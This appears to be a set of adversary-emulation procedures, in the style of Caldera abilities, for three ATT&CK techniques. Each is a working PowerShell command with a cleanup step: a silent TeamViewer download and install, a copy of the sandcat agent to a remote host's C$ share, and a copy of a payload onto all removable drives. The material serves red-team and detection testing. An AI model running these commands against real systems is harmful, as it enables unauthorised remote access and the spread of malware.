**Technique: Remote Access Software (T1219)**

**Command (psh):**
```
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe;
$file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe";
Start-Process -Wait $file1 /S;
Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
```

**Cleanup:**
```
$file = 'C:\Program Files (x86)\TeamViewer\uninstall.exe';
if(Test-Path $file){ Start-Process $file "/S" -ErrorAction Ignore | Out-Null }
$file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe";
Remove-Item $file1 -ErrorAction Ignore | Out-Null
```

**Technique: Remote Services: SMB/Windows Admin Shares (T1021.002)**

**Command (psh):**
```
$path = "sandcat.go-windows";
$drive = "\\#{remote.host.fqdn}\C$";
Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
```

**Cleanup:**
```
$drive = "\\#{remote.host.fqdn}\C$";
Remove-Item -Path $drive"\Users\Public\s4ndc4t.exe" -Force;
```

**Technique: Replication Through Removable Media (T1091)**

**Command (psh):**
```
$RemovableDrives=@();
$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID;
ForEach ($Drive in $RemovableDrives) {
  write-host "Removable Drive Found:" $Drive;
  cp "#{location}" "$Drive\t1091.exe" -Force;
}
```

**Cleanup:**
```
$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID;
ForEach ($Drive in $RemovableDrives) {
  Remove-Item -Path "$Drive\t1091.exe" -Force -ErrorAction Ignore
}
```

